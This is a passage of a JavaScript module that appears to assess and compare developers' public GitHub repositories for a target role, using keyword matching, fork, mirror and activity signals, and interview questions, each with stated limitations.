'use strict';

const ROLE_PROFILES = [
  { match: /react\s*native|mobile engineer|mobile developer|\bios\b|\bandroid\b/i, terms: ['react native', 'react-native', 'expo', 'mobile', 'ios', 'android', 'typescript', 'javascript'] },
  { match: /frontend|front.end|web developer|ui engineer/i, terms: ['react', 'next.js', 'nextjs', 'vue', 'angular', 'javascript', 'typescript', 'css', 'html', 'accessibility', 'frontend'] },
  { match: /backend|back.end|api engineer|server engineer/i, terms: ['node.js', 'nodejs', 'express', 'api', 'rest', 'graphql', 'postgresql', 'database', 'python', 'authentication', 'backend'] },
  { match: /full.?stack/i, terms: ['react', 'next.js', 'nextjs', 'node.js', 'nodejs', 'api', 'database', 'typescript', 'javascript', 'frontend', 'backend'] },
  { match: /\bai\b|artificial intelligence|\bllm\b|machine learning|ml engineer/i, terms: ['ai', 'llm', 'machine learning', 'openai', 'openrouter', 'embeddings', 'agent', 'model', 'python', 'inference', 'prompt'] },
  { match: /open.source|contribut|maintainer|community/i, terms: ['contributing', 'contribution', 'issue', 'pull request', 'release', 'test', 'documentation', 'cli', 'plugin', 'maintainer'] },
];

const TECHNOLOGY_PROFILES = [
  {
    match: /\breact(?:\.js|js)?\b|\bjsx\b|\btsx\b/i,
    terms: ['react', 'react.js', 'reactjs', 'react native', 'react-native', 'jsx', 'tsx', 'next.js', 'nextjs', 'remix', 'gatsby'],
  },
];

const KNOWN_TECHNOLOGY_SIGNALS = [
  { label: 'React Native', terms: ['react native', 'react-native'] },
  { label: 'React', terms: ['react', 'react.js', 'reactjs'] },
  { label: 'Next.js', terms: ['next.js', 'nextjs'] },
  { label: 'Expo', terms: ['expo'] },
  { label: 'Node.js', terms: ['node.js', 'nodejs'] },
  { label: 'Express', terms: ['express'] },
  { label: 'TypeScript', terms: ['typescript'] },
  { label: 'JavaScript', terms: ['javascript'] },
  { label: 'Python', terms: ['python'] },
  { label: 'OpenRouter', terms: ['openrouter'] },
  { label: 'OpenAI', terms: ['openai'] },
  { label: 'LLM', terms: ['llm', 'large language model'] },
  { label: 'PostgreSQL', terms: ['postgresql', 'postgres'] },
  { label: 'Firebase', terms: ['firebase'] },
  { label: 'Supabase', terms: ['supabase'] },
  { label: 'Vite', terms: ['vite'] },
  { label: 'GraphQL', terms: ['graphql'] },
  { label: 'Docker', terms: ['docker'] },
  { label: 'Vue.js', terms: ['vue.js', 'vue'] },
  { label: 'Angular', terms: ['angular'] },
  { label: 'Tailwind CSS', terms: ['tailwind css', 'tailwindcss'] },
  { label: 'Svelte', terms: ['svelte'] },
  { label: 'Remix', terms: ['remix'] },
  { label: 'Gatsby', terms: ['gatsby'] },
  { label: 'FastAPI', terms: ['fastapi'] },
  { label: 'Django', terms: ['django'] },
  { label: 'Flask', terms: ['flask'] },
  { label: 'NestJS', terms: ['nestjs', 'nest.js'] },
  { label: 'Prisma', terms: ['prisma'] },
  { label: 'MongoDB', terms: ['mongodb'] },
  { label: 'Redis', terms: ['redis'] },
  { label: 'MySQL', terms: ['mysql'] },
  { label: 'SQLite', terms: ['sqlite'] },
];

function containsTextTerm(value, term) {
  const normalize = (text) => String(text || '').toLowerCase().replace(/[^a-z0-9]+/g, ' ').trim();
  const normalizedText = normalize(value);
  const normalizedTerm = normalize(term);
  return Boolean(normalizedText && normalizedTerm && (' ' + normalizedText + ' ').includes(' ' + normalizedTerm + ' '));
}

const STOP_WORDS = new Set([
  'the', 'and', 'for', 'with', 'from', 'that', 'this', 'into', 'about', 'work', 'role',
  'engineer', 'developer', 'senior', 'junior', 'mid', 'level', 'looking', 'best', 'which',
  'project', 'projects', 'account', 'github', 'repo', 'repository', 'repositories', 'compare',
  'need', 'want', 'should', 'would', 'could', 'can', 'does', 'have', 'has', 'their', 'they',
  'them', 'your', 'you', 'our', 'what', 'who', 'how', 'why', 'based', 'evidence', 'public',
]);

function cleanText(value, max = 240) {
  return typeof value === 'string'
    ? value.replace(/[\u0000-\u001f\u007f]/g, ' ').replace(/\s+/g, ' ').trim().slice(0, max)
    : '';
}

function words(value) {
  return [...new Set(cleanText(value, 500).toLowerCase().match(/[a-z0-9+#.-]+/g) || [])]
    .filter((word) => word.length > 1 && !STOP_WORDS.has(word));
}

function inferRoleTerms(goal, context = '') {
  const combined = cleanText(goal, 160) + ' ' + cleanText(context, 500);
  const profile = ROLE_PROFILES.find((item) => item.match.test(combined));
  const technologyProfile = TECHNOLOGY_PROFILES.find((item) => item.match.test(combined));
  const profileTerms = profile ? profile.terms : [];
  const technologyTerms = technologyProfile ? technologyProfile.terms : [];
  const customTerms = words(combined).filter((word) => !STOP_WORDS.has(word));
  return [...new Set([...profileTerms, ...technologyTerms, ...customTerms])].slice(0, 30);
}

function repositorySearchText(repository) {
  return [
    repository && repository.fullName,
    repository && repository.name,
    repository && repository.description,
    repository && repository.language,
    repository && repository.license,
    ...(repository && Array.isArray(repository.topics) ? repository.topics : []),
  ].filter(Boolean).join(' ').toLowerCase();
}

function rankRepositories(repositories, goal, context = '') {
  const terms = inferRoleTerms(goal, context);
  const rows = Array.isArray(repositories) ? repositories : [];
  return rows.map((repository) => {
    const searchable = repositorySearchText(repository);
    const matchedTerms = terms.filter((term) => {
      const normalized = term.toLowerCase();
      return normalized.length > 2 && searchable.includes(normalized);
    });
    const phraseHits = matchedTerms.filter((term) => term.includes(' ') || term.includes('.')).length;
    const score = matchedTerms.length + phraseHits;
    return {
      repository,
      score,
      matchedTerms,
      relevanceReasons: matchedTerms.slice(0, 5).map((term) => 'Public repository metadata matches "' + term + '".'),
    };
  }).sort((left, right) => right.score - left.score ||
    Number(Boolean(left.repository && left.repository.fork)) - Number(Boolean(right.repository && right.repository.fork)) ||
    String(left.repository && left.repository.fullName || '').localeCompare(String(right.repository && right.repository.fullName || '')));
}

function mapRepositoryEvidence(evidenceRows) {
  const mapped = [];
  const sources = [];
  (Array.isArray(evidenceRows) ? evidenceRows : []).forEach((evidence, index) => {
    if (!evidence || !evidence.repository) return;
    const prefix = 'project-' + (index + 1);
    const repoSource = {
      id: prefix,
      type: 'repository',
      title: evidence.repository.fullName || 'Public repository',
      url: evidence.repository.url,
    };
    sources.push(repoSource);
    const sourceIds = { repository: repoSource.id };
    (Array.isArray(evidence.sources) ? evidence.sources : []).forEach((source, sourceIndex) => {
      if (!source || typeof source.url !== 'string' || !/^https:\/\/github\.com\//i.test(source.url)) return;
      const id = prefix + '-source-' + (sourceIndex + 1);
      sources.push({ id, type: source.type || 'repository-evidence', title: cleanText(source.title || source.type || 'GitHub source', 180), url: source.url });
      if (source.id) sourceIds[source.id] = id;
    });
    mapped.push({
      repository: evidence.repository,
      readme: evidence.readme || null,
      commits: Array.isArray(evidence.commits) ? evidence.commits : [],
      issues: Array.isArray(evidence.issues) ? evidence.issues : [],
      release: evidence.release || null,
      latestCommitAt: evidence.latestCommitAt || null,
      sourceIds,
    });
  });
  return { rows: mapped, sources };
}


const MIRROR_LANGUAGE_PATTERN = /\b(?:read[- ]only\s+mirror|mirror(?:ed)?\s+(?:of|from|upstream|repository)|upstream\s+mirror|automatically\s+mirrored|synchroni[sz]ed\s+mirror)\b/i;

function buildRepositoryOriginSignal(repository, readmeText, repositorySourceId, readmeSourceId = null) {
  const parentName = typeof repository.parentFullName === 'string' &&
    /^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+$/.test(repository.parentFullName)
    ? repository.parentFullName
    : null;
  const mirrorUrl = typeof repository.mirrorUrl === 'string' && repository.mirrorUrl.trim()
    ? repository.mirrorUrl.trim().slice(0, 500)
    : null;
  if (repository.fork === true) {
    return {
      kind: 'observed',
      label: 'GitHub-marked fork',
      detail: parentName
        ? 'GitHub marks this repository as a fork of ' + parentName + '. This relationship does not show how much original work this account added.'
        : 'GitHub marks this repository as a fork, but the parent repository was not present in this snapshot.',
      parentFullName: parentName,
      parentUrl: parentName ? 'https://github.com/' + parentName : null,
      sourceIds: [repositorySourceId],
    };
  }
  if (mirrorUrl) {
    return {
      kind: 'observed',
      label: 'GitHub-reported mirror source',
      detail: 'GitHub metadata reports this repository mirrors ' + mirrorUrl + '. Verify the source and history before attributing original work.',
      mirrorUrl,
      sourceIds: [repositorySourceId],
    };
  }
  const descriptionSuggestsMirror = MIRROR_LANGUAGE_PATTERN.test(String(repository.description || ''));
  const readmeSuggestsMirror = MIRROR_LANGUAGE_PATTERN.test(String(readmeText || ''));
  if (descriptionSuggestsMirror || readmeSuggestsMirror) {
    const sourceIds = [repositorySourceId];
    if (readmeSuggestsMirror && readmeSourceId) sourceIds.push(readmeSourceId);
    return {
      kind: 'inference',
      label: 'Possible mirror — verify origin',
      detail: 'The public description or README uses mirror-related wording. This is a lead to verify against the upstream repository and history, not a confirmed classification.',
      sourceIds,
    };
  }
  return {
    kind: 'observed',
    label: 'Origin not established',
    detail: 'This snapshot does not mark the repository as a fork or report a mirror source. That does not prove the repository contains original work.',
    sourceIds: [repositorySourceId],
  };
}

function buildRepositoryActivitySignal(repository, sourceId) {
  const timestamp = repository && repository.pushedAt ? Date.parse(repository.pushedAt) : NaN;
  if (!Number.isFinite(timestamp)) {
    return {
      kind: 'observed',
      label: 'Push date unavailable',
      detail: 'GitHub did not provide a usable last-push date in this snapshot. No conclusion about project activity can be drawn from a missing date.',
      sourceIds: [sourceId],
    };
  }
  const date = new Date(timestamp).toISOString().slice(0, 10);
  const ageDays = Math.max(0, Math.floor((Date.now() - timestamp) / 86400000));
  const olderThanYear = ageDays >= 365;
  return {
    kind: 'observed',
    label: olderThanYear ? 'No recorded push in the last 12 months' : 'Push recorded within the last 12 months',
    detail: 'GitHub reports the last push on ' + date + '. This is a repository activity signal, not a measure of code quality or individual ability; a quiet history does not prove abandonment.',
    lastPushDate: date,
    daysSincePush: ageDays,
    sourceIds: [sourceId],
  };
}

function buildRepositoryArchiveSignal(repository, sourceId) {
  const archived = repository && repository.archived === true;
  return {
    kind: 'observed',
    label: archived ? 'GitHub marks this repository archived' : 'Not marked archived by GitHub',
    detail: archived
      ? 'GitHub reports this repository as archived. Confirm current maintainer intent before assuming it will receive updates.'
      : 'GitHub does not mark this repository archived in the current snapshot; that alone does not prove it is actively maintained.',
    sourceIds: [sourceId],
  };
}

function buildRepositoryAttributionSignal(sourceId) {
  return {
    kind: 'unknown',
    label: 'Individual authorship not established',
    detail: 'Repository ownership, stars and commit volume do not prove who wrote the code or how much original work this account contributed.',
    sourceIds: [sourceId],
  };
}

function buildDeveloperAssessment(discovery, roleInput, contextInput = '', evidenceRows = []) {
  const account = discovery && discovery.account ? discovery.account : {};
  const role = cleanText(roleInput, 120) || 'Software Engineering';
  const context = cleanText(contextInput, 500);
  const mapped = mapRepositoryEvidence(evidenceRows);
  const enrichedByName = new Map(mapped.rows.map((row) => [String(row.repository.fullName || '').toLowerCase(), row]));
  const roleTerms = inferRoleTerms(role, context);
  const ranked = rankRepositories(discovery && discovery.repositories, role, context)
    .map((item) => {
      const evidence = enrichedByName.get(String(item.repository && item.repository.fullName || '').toLowerCase());
      const readmeText = evidence && evidence.readme && typeof evidence.readme.content === 'string'
        ? evidence.readme.content
        : '';
      const readmeTerms = roleTerms.filter((term) => term.length > 2 && containsTextTerm(readmeText, term));
      const matchedTerms = [...new Set([...(item.matchedTerms || []), ...readmeTerms])];
      return {
        ...item,
        score: item.score + readmeTerms.length,
        matchedTerms,
        relevanceReasons: [
          ...item.relevanceReasons,
          ...readmeTerms.map((term) => 'The inspected public README mentions "' + term + '".'),
        ],
      };
    })
    .sort((left, right) => right.score - left.score ||
      Number(Boolean(left.repository && left.repository.fork)) - Number(Boolean(right.repository && right.repository.fork)) ||
      String(left.repository && left.repository.fullName || '').localeCompare(String(right.repository && right.repository.fullName || '')));
  const selected = ranked.filter((item) => item.score > 0).slice(0, 4);
  const sources = [{
    id: 'account-profile',
    type: 'profile',
    title: 'GitHub account @' + cleanText(account.login || 'unknown', 39),
    url: /^https:\/\/github\.com\//i.test(account.url || '') ? account.url : 'https://github.com/' + encodeURIComponent(account.login || ''),
  }];
  const projectRows = [];
  const technologyMap = new Map();

  for (const item of selected) {
    const repository = item.repository || {};
    const evidence = enrichedByName.get(String(repository.fullName || '').toLowerCase());
    const id = 'repository-' + (projectRows.length + 1);
    const repositorySource = {
      id,
      type: 'repository',
      title: cleanText(repository.fullName || repository.name || 'Public repository', 180),
      url: /^https:\/\/github\.com\//i.test(repository.url || '') ? repository.url : 'https://github.com/' + String(repository.fullName || '').split('/').map(encodeURIComponent).join('/'),
    };
    sources.push(repositorySource);
    let readmeText = '';
    let readmeSource = null;
    if (evidence && evidence.readme && typeof evidence.readme.content === 'string') {
      readmeText = evidence.readme.content.toLowerCase();
      readmeSource = evidence.sourceIds.readme || id;
    }
    const terms = [...new Set(item.matchedTerms)];
    const documentationSignals = [];
    if (evidence && evidence.readme) {
      documentationSignals.push({ label: 'README inspected', detail: evidence.readme.truncated ? 'README sample is truncated.' : 'A public README was available.', sourceId: readmeSource || id });
      if (/\b(test|testing|vitest|jest|mocha)\b/i.test(readmeText)) documentationSignals.push({ label: 'Testing mentioned in README', detail: 'README text mentions testing; actual test quality was not verified.', sourceId: readmeSource || id });
      if (/\b(contribut|pull request|development setup|getting started)\b/i.test(readmeText)) documentationSignals.push({ label: 'Contributor or setup guidance mentioned', detail: 'README mentions contributor or setup guidance; completeness was not independently graded.', sourceId: readmeSource || id });
    }
    if (repositorySource.url) {
      projectRows.push({
        fullName: cleanText(repository.fullName || repository.name, 180),
        url: repositorySource.url,
        description: cleanText(repository.description || 'No public description supplied.', 400),
        language: cleanText(repository.language || 'Not reported', 80),
        stars: Number.isFinite(repository.stars) ? repository.stars : null,
        pushedAt: repository.pushedAt || null,
        relevance: item.score > 0 ? 'Relevant public signals found' : 'Limited role-specific signals',
        matchedTerms: terms,
        reasons: terms.length ? item.relevanceReasons : ['No target-role terms were matched in this repository’s public metadata.'],
        sourceIds: [id],
        archived: repository.archived === true,
        fork: repository.fork === true,
        parentFullName: repository.parentFullName || null,
        mirrorUrl: repository.mirrorUrl || null,
        originSignal: buildRepositoryOriginSignal(
          repository,
          evidence && evidence.readme && evidence.readme.content || '',
          id,
          readmeSource,
        ),
        activitySignal: buildRepositoryActivitySignal(repository, id),
        archiveSignal: buildRepositoryArchiveSignal(repository, id),
        attributionSignal: buildRepositoryAttributionSignal(id),
        license: repository.license || null,
        documentationSignals,
      });
    }
  }

  for (const source of mapped.sources) sources.push(source);

  const repositorySourceByUrl = new Map(sources
    .filter((source) => source.type === 'repository' && source.url)
    .map((source) => [source.url, source.id]));
  const sourceForSnapshotRepository = (repository, index) => {
    const url = /^https:\/\/github\.com\//i.test(repository && repository.url || '')
      ? repository.url
      : 'https://github.com/' + String(repository && repository.fullName || '').split('/').map(encodeURIComponent).join('/');
    if (repositorySourceByUrl.has(url)) return repositorySourceByUrl.get(url);
    const id = 'snapshot-repository-' + (index + 1);
    sources.push({
      id,
      type: 'repository',
      title: cleanText(repository && (repository.fullName || repository.name) || 'Public repository', 180),
      url,
    });
    repositorySourceByUrl.set(url, id);
    return id;
  };
  const addTechnologySignal = (label, repository, sourceId) => {
    if (!label || !repository) return;
    const repoKey = String(repository.fullName || repository.name || sourceId).toLowerCase();
    const previous = technologyMap.get(label) || {
      technology: label,
      repositoryCount: 0,
      sourceIds: [],
      _repositoryKeys: new Set(),
    };
    if (!previous._repositoryKeys.has(repoKey)) {
      previous._repositoryKeys.add(repoKey);
      previous.repositoryCount += 1;
      if (previous.sourceIds.length < 4) previous.sourceIds.push(sourceId);
    }
    technologyMap.set(label, previous);
  };

  const returnedRepositories = Array.isArray(discovery && discovery.repositories) ? discovery.repositories : [];
  returnedRepositories.forEach((repository, index) => {
    const searchable = repositorySearchText(repository);
    const matchingSignals = KNOWN_TECHNOLOGY_SIGNALS.filter((signal) =>
      signal.terms.some((term) => containsTextTerm(searchable, term)));
    if (!repository.language && !matchingSignals.length) return;
    const sourceId = sourceForSnapshotRepository(repository, index);
    if (repository.language) addTechnologySignal(repository.language, repository, sourceId);
    for (const signal of matchingSignals) addTechnologySignal(signal.label, repository, sourceId);
  });

  // Technology evidence from README content is bounded to repositories that were actually inspected.
  mapped.rows.forEach((evidence, index) => {
    if (!evidence || !evidence.repository || !evidence.readme || typeof evidence.readme.content !== 'string') return;
    const repoIndex = returnedRepositories.findIndex((repository) =>
      String(repository.fullName || '').toLowerCase() === String(evidence.repository.fullName || '').toLowerCase());
    const sourceId = sourceForSnapshotRepository(evidence.repository, repoIndex >= 0 ? repoIndex : index);
    for (const signal of KNOWN_TECHNOLOGY_SIGNALS) {
      if (signal.terms.some((term) => containsTextTerm(evidence.readme.content, term))) {
        addTechnologySignal(signal.label, evidence.repository, sourceId);
      }
    }
  });
  const languages = [...new Set((discovery && discovery.repositories || []).map((repository) => repository.language).filter(Boolean))];
  const activityCandidates = (discovery && discovery.repositories || [])
    .filter((repository) => repository.pushedAt)
    .sort((left, right) => (Date.parse(right.pushedAt) || 0) - (Date.parse(left.pushedAt) || 0))
    .slice(0, 5);
  const activities = activityCandidates.map((repository, index) => {
    let source = sources.find((item) => item.type === 'repository' && item.url === repository.url);
    if (!source) {
      source = {
        id: 'activity-repository-' + (index + 1),
        type: 'repository',
        title: cleanText(repository.fullName || 'Public repository', 180),
        url: /^https:\/\/github\.com\//i.test(repository.url || '') ? repository.url : null,
      };
      if (source.url) sources.push(source);
    }
    return {
      repository: repository.fullName,
      pushedAt: repository.pushedAt,
      url: repository.url,
      sourceIds: [source && source.url ? source.id : 'account-profile'],
    };
  });

  const strengths = [];
  for (const project of projectRows.filter((item) => item.matchedTerms.length).slice(0, 4)) {
    strengths.push({
      claim: project.fullName + ' has public metadata relevant to ' + role + (project.matchedTerms.length ? ': ' + project.matchedTerms.slice(0, 4).join(', ') + '.' : '.'),
      sourceIds: project.sourceIds,
    });
  }
  if (strengths.length === 0) strengths.push({
    claim: 'The returned public repository metadata does not provide a strong direct match for "' + role + '". This is an evidence gap, not proof the developer lacks the skill.',
    sourceIds: ['account-profile'],
  });

  const gaps = [
    'Repository ownership and metadata do not prove that the account owner authored all code or can independently maintain the project.',
    'Public metadata cannot establish code quality, collaboration, reliability, system-design judgment, or performance in a role.',
  ];
  if ((discovery && discovery.limitReached) || (account.publicRepos > (discovery && discovery.returnedCount || 0))) {
    gaps.push('The account repository list is capped or incomplete; conclusions apply only to the returned sample.');
  }
  if (!mapped.rows.length) gaps.push('README, issue, commit and release details were not collected for a matching project; this assessment relies on account-level repository metadata.');

  const bestProject = projectRows[0];
  const interviewQuestions = [
    {
      question: bestProject
        ? 'Walk through the architecture of ' + bestProject.fullName + ' and explain one important trade-off you made.'
        : 'Describe a project that best demonstrates your experience with ' + role + ' and explain your individual contribution.',
      why: 'Verifies design understanding and personal contribution that public metadata cannot establish.',
      sourceIds: bestProject ? bestProject.sourceIds : ['account-profile'],
    },
    {
      question: 'How do you test, debug, and safely release a change in a project like this?',
      why: 'Tests engineering practices that cannot be inferred from repository counts or activity alone.',
      sourceIds: bestProject ? bestProject.sourceIds : ['account-profile'],
    },
    {
      question: context
        ? 'Show how you would approach this role requirement: ' + context.slice(0, 180) + '.'
        : 'Choose one unverified requirement for this role and explain how you would demonstrate it in a small practical exercise.',
      why: 'Connects the assessment to the stated role or evaluation context.',
      sourceIds: bestProject ? bestProject.sourceIds : ['account-profile'],
    },
  ];

  const returnedCount = Number.isFinite(discovery && discovery.returnedCount) ? discovery.returnedCount : ((discovery && discovery.repositories) || []).length;
  const publicRepos = Number.isFinite(account.publicRepos) ? account.publicRepos : returnedCount;
  const surfacedProjects = projectRows.filter((project) => project.matchedTerms.length).slice(0, 3);
  const summary = surfacedProjects.length
    ? 'The public snapshot surfaced possible role-relevant evidence in ' + surfacedProjects.map((project) => project.fullName).join(', ') + '. These leads come from keyword overlap in public metadata and inspected README text; they are not proof of proficiency or an overall developer score.'
    : 'The current public repository snapshot does not show a clear metadata match for "' + role + '". That does not establish that the developer lacks this experience; more targeted project evidence or a technical screen is needed.';
  return {
    kind: 'developer-assessment',
    account: { login: cleanText(account.login || 'unknown', 39), name: cleanText(account.name || '', 160), url: sources[0].url, publicRepos, returnedCount },
    role,
    context,
    summary,
    relevantProjects: projectRows,
    demonstratedTechnologies: [...technologyMap.values()]
      .map(({ _repositoryKeys, ...item }) => ({ ...item, sourceIds: [...new Set(item.sourceIds)] }))
      .sort((left, right) => right.repositoryCount - left.repositoryCount || left.technology.localeCompare(right.technology))
      .slice(0, 14),
    languagesInReturnedSnapshot: languages,
    activity: {
      observationBasis: 'Current public repository metadata; up to five most recently pushed repositories from the returned list.',
      recentRepositories: activities,
      sampledRepositories: returnedCount,
      listMayBeIncomplete: Boolean(discovery && discovery.limitReached) || returnedCount < publicRepos,
    },
    strengths,
    evidenceGaps: gaps,
    interviewQuestions,
    nextStep: bestProject
      ? 'Inspect ' + bestProject.fullName + ', review its cited project evidence, then use a role-relevant technical screen to verify implementation quality and individual contribution.'
      : 'Ask the developer to nominate a role-relevant project, review its code and tests, and use a small practical exercise to verify the required skills.',
    evidenceInterpretation: {
      observed: [
        'GitHub fork flags, reported mirror sources, archived state and last-push dates are displayed as repository metadata when available.',
        'Repository links identify the public records used for each signal.',
      ],
      inferred: [
        'Possible-mirror labels are heuristics based on description or README wording and require manual verification.',
        'Role relevance is estimated from keyword overlap in public metadata and inspected README text; mentions do not prove proficiency.',
      ],
      unknown: [
        'Individual authorship and the amount of original work contributed by an account.',
        'Code quality, engineering judgment, collaboration, private work or job performance.',
      ],
    },
    limitations: [
      'Assessment uses public GitHub evidence only and cannot establish private work or professional performance.',
      'Matched keywords are relevance signals, not proof of proficiency.',
      'Fork status and mirror clues do not establish how much original work an account contributed.',
      'A quiet push history or missing release is not proof that a project is abandoned.',
      'Only the returned repository sample and any explicitly inspected README/activity evidence were assessed.',
    ],
    sources: [...new Map(sources.filter((source) => source.url).map((source) => [source.id, source])).values()],
  };
}

function technologySourceIds(assessment) {
  return [...new Set((assessment && Array.isArray(assessment.demonstratedTechnologies) ? assessment.demonstratedTechnologies : [])
    .flatMap((item) => Array.isArray(item.sourceIds) ? item.sourceIds : []))];
}

function formatTechnologySignals(assessment) {
  const signals = (assessment && Array.isArray(assessment.demonstratedTechnologies) ? assessment.demonstratedTechnologies : [])
    .map((item) => item.technology)
    .filter(Boolean);
  if (!signals.length) return 'No recognizable technology signals in returned sample';
  const visible = signals.slice(0, 8);
  return visible.join(', ') + (signals.length > visible.length ? ' +' + (signals.length - visible.length) + ' more' : '');
}

function buildDeveloperComparison(left, right, goal) {
  const leftProjects = left && Array.isArray(left.relevantProjects) ? left.relevantProjects : [];
  const rightProjects = right && Array.isArray(right.relevantProjects) ? right.relevantProjects : [];
  const leftTerms = new Set(leftProjects.flatMap((project) => project.matchedTerms || []));
  const rightTerms = new Set(rightProjects.flatMap((project) => project.matchedTerms || []));
  const overlap = [...leftTerms].filter((term) => rightTerms.has(term)).sort();
  const leftNewest = left && left.activity && left.activity.recentRepositories && left.activity.recentRepositories[0];
  const rightNewest = right && right.activity && right.activity.recentRepositories && right.activity.recentRepositories[0];
  const leftDate = leftNewest && Date.parse(leftNewest.pushedAt) || 0;
  const rightDate = rightNewest && Date.parse(rightNewest.pushedAt) || 0;
  const criteria = [
    {
      label: 'Role-relevant public project leads',
      leftValue: leftProjects.filter((project) => project.matchedTerms && project.matchedTerms.length).map((project) => project.fullName).join(', ') || 'No relevant project lead surfaced',
      rightValue: rightProjects.filter((project) => project.matchedTerms && project.matchedTerms.length).map((project) => project.fullName).join(', ') || 'No relevant project lead surfaced',
      interpretation: 'Names are leads selected by keyword overlap in returned metadata and inspected README samples. Neither list length nor ordering measures individual ability.',
      leftSourceIds: leftProjects.map((project) => project.sourceIds[0]),
      rightSourceIds: rightProjects.map((project) => project.sourceIds[0]),
    },
    {
      label: 'Visible technology signals in public snapshot',
      leftValue: formatTechnologySignals(left),
      rightValue: formatTechnologySignals(right),
      interpretation: 'Signals are collected from returned repository language fields and recognizable terms in metadata or inspected README samples. Mentions do not prove hands-on proficiency.',
      leftSourceIds: technologySourceIds(left),
      rightSourceIds: technologySourceIds(right),
    },
    {
      label: 'Latest recorded push in returned repositories',
      leftValue: leftNewest ? leftNewest.pushedAt : 'No push date in returned sample',
      rightValue: rightNewest ? rightNewest.pushedAt : 'No push date in returned sample',
      interpretation: leftDate && rightDate
        ? (leftDate === rightDate ? 'The newest recorded push dates are the same.' : leftDate > rightDate ? 'The left account has a more recent recorded push; recency is not a quality ranking.' : 'The right account has a more recent recorded push; recency is not a quality ranking.')
        : 'At least one account has no comparable recorded push date in the returned sample.',
      leftSourceIds: leftNewest ? leftNewest.sourceIds : ['account-profile'],
      rightSourceIds: rightNewest ? rightNewest.sourceIds : ['account-profile'],
    },
    {
      label: 'Shared role-related signals',
      leftValue: overlap.length ? overlap.join(', ') : 'No shared matched terms in current evidence',
      rightValue: overlap.length ? overlap.join(', ') : 'No shared matched terms in current evidence',
      interpretation: overlap.length ? 'These signals appear in both snapshots; inspect the cited project sources to determine how each is used.' : 'No shared matched terms were detected in the selected evidence; this may reflect limited metadata rather than a true skills difference.',
      leftSourceIds: leftProjects.map((project) => project.sourceIds[0]),
      rightSourceIds: rightProjects.map((project) => project.sourceIds[0]),
    },
  ];
  const summarizeRoleSignals = (assessment) => {
    const projects = Array.isArray(assessment && assessment.relevantProjects) ? assessment.relevantProjects : [];
    const relevantProjects = projects.filter((project) =>
      project && Array.isArray(project.matchedTerms) && project.matchedTerms.length > 0);
    const signalCount = relevantProjects.reduce((count, project) =>
      count + new Set(project.matchedTerms.map((term) => cleanText(term, 80).toLowerCase()).filter(Boolean)).size, 0);
    return {
      login: cleanText(assessment && assessment.account && assessment.account.login || 'unknown', 39),
      roleRelevantProjectCount: relevantProjects.length,
      roleMatchSignalCount: signalCount,
    };
  };
  const leftEvidence = summarizeRoleSignals(left);
  const rightEvidence = summarizeRoleSignals(right);
  let preferredSide = 'no_clear_preference';
  if (leftEvidence.roleMatchSignalCount !== rightEvidence.roleMatchSignalCount) {
    preferredSide = leftEvidence.roleMatchSignalCount > rightEvidence.roleMatchSignalCount ? 'left' : 'right';
  } else if (leftEvidence.roleRelevantProjectCount !== rightEvidence.roleRelevantProjectCount) {
    preferredSide = leftEvidence.roleRelevantProjectCount > rightEvidence.roleRelevantProjectCount ? 'left' : 'right';
  }

  let verdictHeadline;
  let verdictReason;
  if (preferredSide === 'left' || preferredSide === 'right') {
    const preferred = preferredSide === 'left' ? leftEvidence : rightEvidence;
    const other = preferredSide === 'left' ? rightEvidence : leftEvidence;
    verdictHeadline = 'Preliminary pick for further evaluation: @' + preferred.login;
    verdictReason = 'In the returned public snapshot, @' + preferred.login + ' has ' +
      preferred.roleMatchSignalCount + ' role-match signals across ' + preferred.roleRelevantProjectCount +
      ' role-relevant project lead(s), compared with ' + other.roleMatchSignalCount + ' signals across ' +
      other.roleRelevantProjectCount + ' lead(s) for @' + other.login +
      '. This is a transparent keyword/metadata comparison, not a measure of engineering quality or proof of skill.';
  } else {
    verdictHeadline = 'No clear preference from the available evidence';
    verdictReason = 'Both returned snapshots have ' + leftEvidence.roleMatchSignalCount +
      ' role-match signals across ' + leftEvidence.roleRelevantProjectCount + ' role-relevant project lead(s). ' +
      'This evidence does not distinguish the candidates reliably, so inspect their code and ask for a role-specific technical exercise.';
  }

  const verdict = {
    outcome: preferredSide,
    headline: verdictHeadline,
    reason: verdictReason,
    left: leftEvidence,
    right: rightEvidence,
    method: 'Preference is based first on the number of matched role-related terms across surfaced projects, then on the number of role-relevant project leads. Push recency, stars and repository totals do not decide this verdict.',
    caveat: 'Use this as a shortlist suggestion only. The comparison cannot verify individual authorship, implementation quality, private work, or performance in the job.',
  };
  const summary = 'This comparison surfaces public evidence related to "' + cleanText(goal, 120) +
    '". The preliminary verdict identifies which profile is better supported by the returned role-related signals for a closer look—not who is the better engineer overall.';
  return {
    kind: 'developer-comparison',
    goal: cleanText(goal, 160),
    summary,
    verdict,
    criteria,
    sharedSignals: overlap,
    left,
    right,
    limitations: [
      'The comparison covers only the returned public repository lists and bounded README/activity samples.',
      'Repository count, stars, commit volume and push recency are not direct measures of engineering quality.',
      'Private work, individual authorship and role performance cannot be established from this evidence.',
    ],
  };
}

function buildRepositoryHealth(evidence) {
  const repository = evidence && evidence.repository ? evidence.repository : {};
  const issues = Array.isArray(evidence && evidence.issues) ? evidence.issues : [];
  const commits = Array.isArray(evidence && evidence.commits) ? evidence.commits : [];
  const readme = evidence && evidence.readme;
  const release = evidence && evidence.release;
  const sources = Array.isArray(evidence && evidence.sources) ? evidence.sources : [];
  const sourceFor = (type, fallback = 'repository') => {
    const found = sources.find((source) => source.type === type && source.url);
    return found ? found.id : fallback;
  };
  const signals = [];
  const repoSource = sourceFor('repository');
  if (repository.archived) {
    signals.push({ label: 'Archived status', kind: 'observed', detail: 'GitHub marks this repository as archived. Confirm whether maintainers intend to resume changes before preparing a revival.', sourceIds: [repoSource] });
  }
  if (repository.disabled) {
    signals.push({ label: 'Disabled repository', kind: 'observed', detail: 'GitHub metadata marks this repository as disabled. Verify current access and status before suggesting contribution work.', sourceIds: [repoSource] });
  }
  const pushed = repository.pushedAt ? Date.parse(repository.pushedAt) : NaN;
  const ageDays = Number.isFinite(pushed) ? Math.max(0, Math.floor((Date.now() - pushed) / 86400000)) : null;
  if (ageDays === null) {
    signals.push({ label: 'Push history unavailable', kind: 'observed', detail: 'No valid last-push date was supplied in this snapshot.', sourceIds: [repoSource] });
  } else if (ageDays > 365) {
    signals.push({ label: 'Older recorded activity', kind: 'observed', detail: 'The last recorded repository push was about ' + Math.floor(ageDays / 30) + ' month(s) ago. Inactivity alone does not prove the project is abandoned.', sourceIds: [repoSource] });
  } else {
